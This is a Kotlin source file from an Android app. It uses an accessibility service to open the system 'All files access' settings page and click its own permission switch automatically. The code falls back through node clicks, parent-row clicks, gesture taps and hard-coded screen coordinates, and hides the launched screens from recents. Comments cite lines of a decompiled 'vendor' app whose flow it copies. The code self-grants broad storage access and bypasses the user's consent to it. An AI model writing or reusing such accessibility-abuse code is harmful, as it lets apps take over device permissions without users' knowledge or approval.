package com.storm.safe.rock.service.modules.yw5xud.generic

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.automation.A11yWindowResolver
import com.storm.safe.rock.service.modules.yw5xud.OsFamily
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.ALL_FILES_ALLOW_KEYWORDS
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.ALL_FILES_MAX_CONSECUTIVE_NO_SWITCH
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.ALL_FILES_TOGGLE_DEADLINE_MS
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.ALL_FILES_TOGGLE_INTERVAL_MS
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.ALL_FILES_TOGGLE_MAX_ITERATIONS
import com.storm.safe.rock.service.modules.yw5xud.miui.MiuiSteps

/**
 * GenericAllFiles — All files access (MANAGE_EXTERNAL_STORAGE, API 30+).
 * Extracted from GenericSteps.executeAllFilesAccess + autoToggleAllFilesAccess + verifyAllFilesGranted.
 *
 * Matches vendor a9/a7: for API 30+, check Environment.isExternalStorageManager().
 * Adds MIUI predwarm (vendor C0367a4:1810-1820) and correct Intent flags.
 */
class GenericAllFiles(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: GenericSteps
) {
    companion object {
        private const val TAG = "GenericAllFiles"

        /** ALL_FILES Intent flags — vendor C0367a4:1841. NEW_TASK | EXCLUDE_FROM_RECENTS */
        private const val ALL_FILES_FLAGS = Intent.FLAG_ACTIVITY_NEW_TASK or
                                            Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS

        /** MIUI predwarm flags — vendor C0367a4:1813/1818. NEW_TASK|NO_HISTORY|EXCLUDE_FROM_RECENTS|NO_ANIMATION */
        private const val MIUI_PREDWARM_FLAGS = Intent.FLAG_ACTIVITY_NEW_TASK or
                                                 Intent.FLAG_ACTIVITY_NO_HISTORY or
                                                 Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                                                 Intent.FLAG_ACTIVITY_NO_ANIMATION

        /** MIUI ALL_FILES 页面有效包名 (vendor C0367a4:6548). */
        private val MIUI_ALL_FILES_PACKAGES = setOf(
            "com.android.settings",
            "com.xiaomi.misettings"
        )

        /** 坐标兜底 X 比例 (vendor C0367a4:1915). */
        private const val ALL_FILES_COORD_X_RATIO = 0.875f
        /** 坐标兜底 Y 比例 (vendor C0367a4:1916). */
        private const val ALL_FILES_COORD_Y_RATIO = 0.225f
        /** 父容器上溯深度 (vendor C0327b2:4616). */
        private const val PARENT_CLIMB_DEPTH = 15
        /** 每次点击后验证延迟 (vendor C0367a4:1907). */
        private const val ALL_FILES_VERIFY_DELAY_MS = 150L
        /** 验证轮次 (vendor C0367a4:1960-1977). */
        private const val ALL_FILES_VERIFY_ROUNDS = 3
    }

    /**
     * All files access (MANAGE_EXTERNAL_STORAGE, API 30+).
     * Matches vendor a9/a7: for API 30+, check Environment.isExternalStorageManager().
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (Build.VERSION.SDK_INT < 30) {
            logs.add("所有文件访问: API < 30, 跳过")
            return
        }
        UiDebugger.logStep(TAG, "Flow2: executeAllFilesAccess 开始")
        try {
            if (ui.isExternalStorageManager()) {
                successes.add("所有文件访问已授权")
                return
            }

            // ADAPT: 2026-04-16 — MIUI 品牌优先走专用 4 级回退（vendor C0367a4.m212254b3）。
            // MiuiSteps.executeAllFilesAccess 与 vendor 1:1 对齐；失败时继续走下方 generic 流程作兜底。
            if (steps.isXiaomiBrand()) {
                val miuiSteps = MiuiSteps(service, context)
                val ok = miuiSteps.executeAllFilesAccess(successes, failures, logs)
                if (ok) {
                    UiDebugger.logStep(TAG, "[文件访问] MIUI 专用流程成功，跳过 generic fallback")
                    return
                }
                UiDebugger.logStep(TAG, "[文件访问] MIUI 专用流程未成功，继续 generic fallback")
            }

            // --- MIUI predwarm: 先打开 APPLICATION_DETAILS 页面 (vendor C0367a4:1810-1820) ---
            val isMiui = OsFamily.detect() == OsFamily.MIUI
            if (isMiui) {
                try {
                    if (Build.VERSION.SDK_INT < 35) {
                        val predwarm = Intent().apply {
                            component = android.content.ComponentName(
                                "com.miui.securitycenter",
                                "com.miui.appmanager.ApplicationsDetailsActivity"
                            )
                            putExtra("package_name", context.packageName)
                            flags = MIUI_PREDWARM_FLAGS
                        }
                        (service ?: context).startActivity(predwarm)
                    } else {
                        val predwarm = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:${context.packageName}")
                            flags = MIUI_PREDWARM_FLAGS
                        }
                        (service ?: context).startActivity(predwarm)
                    }
                    UiDebugger.logStep(TAG, "[文件访问] MIUI predwarm: 已打开应用详情页面")
                    steps.waitForPageStable()
                    steps.interruptibleDelay(300L)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    UiDebugger.logStep(TAG, "[文件访问] MIUI predwarm 失败: ${e.message}, 继续直接打开")
                }
            }

            // --- 主 ALL_FILES Intent (vendor flags: 276824064) ---
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                flags = ALL_FILES_FLAGS
            }
            (service ?: context).startActivity(intent)
            logs.add("已发送所有文件访问权限请求")
            steps.waitForPageStable()
            steps.interruptibleDelay(1500L)
            UiDebugger.dumpPage(service, "generic_all_files_before", "文件访问权限页面(已切换)")

            val toggled = autoToggleAllFilesAccess(logs)
            if (toggled) {
                successes.add("所有文件访问已授权")
            } else if (ui.isExternalStorageManager()) {
                successes.add("所有文件访问已授权(延迟确认)")
            } else {
                failures.add("所有文件访问: 自动点击失败，需要用户手动开启")
            }
            UiDebugger.dumpPage(service, "generic_all_files_after", "文件访问权限页面(尝试点击后)")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            try {
                val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
                    flags = ALL_FILES_FLAGS
                }
                (service ?: context).startActivity(fallback)
                logs.add("已发送所有文件访问权限请求(回退)")
            } catch (e2: Exception) {
                failures.add("所有文件访问配置失败: ${e2.message}")
            }
        }
    }

    /**
     * Auto-toggle the "Allow management of all files" switch in the system settings page.
     * Loops up to ALL_FILES_TOGGLE_MAX_ITERATIONS, polling isExternalStorageManager.
     *
     * Strategy per iteration:
     *   1. If Environment.isExternalStorageManager() already true -> done
     *   2. Get fresh rootInActiveWindow (old root is stale after page switch)
     *   3. [MIUI] Package validation + BACK recovery (vendor C0367a4:6548, 6618)
     *   4. Find Switch/CompoundButton node -> performClick + verify
     *   5. Find "允许管理所有文件" text row -> climb parent chain (PARENT_CLIMB_DEPTH) + verify
     *   6. Gesture tap on right-side Switch area + verify
     *   7. Vendor coordinate fallback (C0367a4:1915-1918) + verify
     */
    private suspend fun autoToggleAllFilesAccess(logs: MutableList<String>): Boolean {
        val svc = service ?: run {
            logs.add("[文件权限] service 为 null，无法自动点击")
            return false
        }
        val startTimeMs = android.os.SystemClock.elapsedRealtime()
        var consecutiveNoSwitch = 0
        for (iter in 0 until ALL_FILES_TOGGLE_MAX_ITERATIONS) {
            // 全局 deadline 检查: 6s 后强制跳出，不阻塞后续流程
            val elapsedMs = android.os.SystemClock.elapsedRealtime() - startTimeMs
            if (elapsedMs > ALL_FILES_TOGGLE_DEADLINE_MS) {
                UiDebugger.logStep(TAG, "[文件权限] 达到 deadline ${elapsedMs}ms, 放弃 (iter=$iter)")
                logs.add("[文件权限] 超时跳出，需用户手动授权")
                return false
            }
            if (ui.isExternalStorageManager()) {
                logs.add("[文件权限] 已授权 (iter=$iter)")
                return true
            }
            val root = try {
                A11yWindowResolver.resolveRoot(svc)
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
                null
            }
            if (root == null) {
                steps.interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
                continue
            }
            val pkg = root.packageName?.toString() ?: ""
            UiDebugger.logStep(TAG, "[文件权限] iter=$iter pkg=$pkg root.childCount=${root.childCount}")
            val byIdCount = try {
                root.findAccessibilityNodeInfosByViewId("com.android.settings:id/switchWidget")?.size ?: 0
            } catch (_: Exception) { 0 }
            UiDebugger.logStep(TAG, "[文件权限] iter=$iter byViewId(switchWidget)=$byIdCount")

            // 连续 N 轮 root 只有 1 个子节点且找不到 switchWidget (MIUI a11y 截断) -> 直接放弃
            if (root.childCount <= 1 && byIdCount == 0) {
                consecutiveNoSwitch++
                if (consecutiveNoSwitch >= ALL_FILES_MAX_CONSECUTIVE_NO_SWITCH) {
                    UiDebugger.logStep(TAG, "[文件权限] 连续 $consecutiveNoSwitch 次找不到 Switch, 放弃 (iter=$iter)")
                    logs.add("[文件权限] MIUI a11y 树截断，需用户手动授权")
                    return false
                }
            } else {
                consecutiveNoSwitch = 0
            }

            // --- MIUI 包名验证 + BACK 兜底 (vendor C0367a4:6548, 6618) ---
            val isMiui = OsFamily.detect() == OsFamily.MIUI
            if (isMiui && pkg.isNotEmpty() && !MIUI_ALL_FILES_PACKAGES.contains(pkg)) {
                UiDebugger.logStep(TAG, "[文件权限] MIUI: pkg=$pkg 不在白名单, BACK + 重开")
                svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                steps.interruptibleDelay(500L)
                try {
                    val reIntent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:${context.packageName}")
                        flags = ALL_FILES_FLAGS
                    }
                    (service ?: context).startActivity(reIntent)
                    steps.waitForPageStable()
                    steps.interruptibleDelay(500L)
                } catch (e: kotlinx.coroutines.CancellationException) { throw e }
                catch (_: Exception) { /* 重开失败继续下一轮 */ }
                continue
            }

            // Strategy 1: find Switch/CompoundButton directly (class-based DFS) or by known resource-id
            val switchNode = findFirstToggleNode(root) ?: findSwitchByKnownIds(root)
            if (switchNode != null) {
                UiDebugger.logStep(TAG, "[文件权限] strategy1 找到 Switch class=${switchNode.className}")
                switchNode.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                // vendor C0367a4:1969 — 150ms x 3 快速验证
                if (verifyAllFilesGranted()) return true
                steps.interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
                continue
            }

            // Strategy 2: find allow-keyword text -> climb parent chain for clickable row
            var clickedRow = false
            for (keyword in ALL_FILES_ALLOW_KEYWORDS) {
                val matches = try {
                    root.findAccessibilityNodeInfosByText(keyword)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                    null
                }
                if (matches.isNullOrEmpty()) continue
                for (textNode in matches) {
                    if (!textNode.isVisibleToUser) continue
                    var current: android.view.accessibility.AccessibilityNodeInfo? = textNode.parent
                    var depth = 0
                    while (current != null && depth < PARENT_CLIMB_DEPTH) {
                        if (current.isClickable && current.isVisibleToUser) {
                            UiDebugger.logStep(TAG, "[文件权限] strategy2 点击父容器「$keyword」depth=$depth")
                            current.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            clickedRow = true
                            break
                        }
                        current = current.parent
                        depth++
                    }
                    if (clickedRow) {
                        if (verifyAllFilesGranted()) return true
                        break
                    }

                    // Strategy 3: gesture tap on right-side Switch area
                    val rect = android.graphics.Rect()
                    textNode.getBoundsInScreen(rect)
                    if (rect.width() > 0 && rect.height() > 0) {
                        val dm = context.resources.displayMetrics
                        val switchX = (dm.widthPixels - 120).toFloat()
                        val switchY = rect.centerY().toFloat()
                        UiDebugger.logStep(TAG, "[文件权限] strategy3 gesture tap right-switch at ($switchX,$switchY)")
                        val tapped = GestureTapHelper.performTap(svc, switchX, switchY)
                        if (tapped) {
                            if (verifyAllFilesGranted()) return true
                            clickedRow = true
                            break
                        }
                    }
                }
                if (clickedRow) break
            }
            if (!clickedRow) {
                // Strategy 4: vendor 坐标兜底 (C0367a4:1915-1918)
                val dm = context.resources.displayMetrics
                val coordX = dm.widthPixels * ALL_FILES_COORD_X_RATIO
                val coordY = dm.heightPixels * ALL_FILES_COORD_Y_RATIO
                UiDebugger.logStep(TAG, "[文件权限] strategy4 vendor坐标 ($coordX,$coordY)")
                val tapped = GestureTapHelper.performTap(svc, coordX, coordY)
                if (tapped) {
                    UiDebugger.logStep(TAG, "[文件权限] strategy4 vendor坐标成功")
                    if (verifyAllFilesGranted()) return true
                } else {
                    UiDebugger.dumpPage(svc, "generic_all_files_iter${iter}_no_click",
                        "iter=$iter 所有策略均失败")
                }
            }
            steps.interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
        }
        val finalState = ui.isExternalStorageManager()
        logs.add("[文件权限] 10 次循环结束，isExternalStorageManager=$finalState")
        return finalState
    }

    /** 150ms x 3 快速验证 isExternalStorageManager (vendor C0367a4:1960-1977). */
    private suspend fun verifyAllFilesGranted(): Boolean {
        for (round in 1..ALL_FILES_VERIFY_ROUNDS) {
            steps.interruptibleDelay(ALL_FILES_VERIFY_DELAY_MS)
            if (ui.isExternalStorageManager()) {
                UiDebugger.logStep(TAG, "[文件权限] verified round $round: granted")
                return true
            }
            UiDebugger.logStep(TAG, "[文件权限] verify round $round: not granted, waiting...")
        }
        return false
    }

    /** DFS find first toggle/switch-like node (Switch/CompoundButton/ToggleButton). */
    private fun findFirstToggleNode(node: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
        if (node == null) return null
        val className = node.className?.toString() ?: ""
        val isToggle = listOf("Switch", "Toggle", "CompoundButton", "SwitchCompat")
            .any { className.contains(it, ignoreCase = true) }
        if (isToggle && node.isClickable && node.isVisibleToUser && node.isEnabled) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstToggleNode(child)
            if (found != null) return found
        }
        return null
    }

    /** Find a Switch by its known resource-ids across AOSP and MIUI. */
    private fun findSwitchByKnownIds(root: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
        if (root == null) return null
        val ids = listOf(
            "com.android.settings:id/switchWidget",
            "com.android.settings:id/switch_widget",
            "android:id/switch_widget",
            "com.miui.securitycenter:id/sliding_button"
        )
        for (id in ids) {
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                for (node in nodes) {
                    if (node.isClickable && node.isVisibleToUser && node.isEnabled) return node
                }
            }
        }
        return null
    }
}
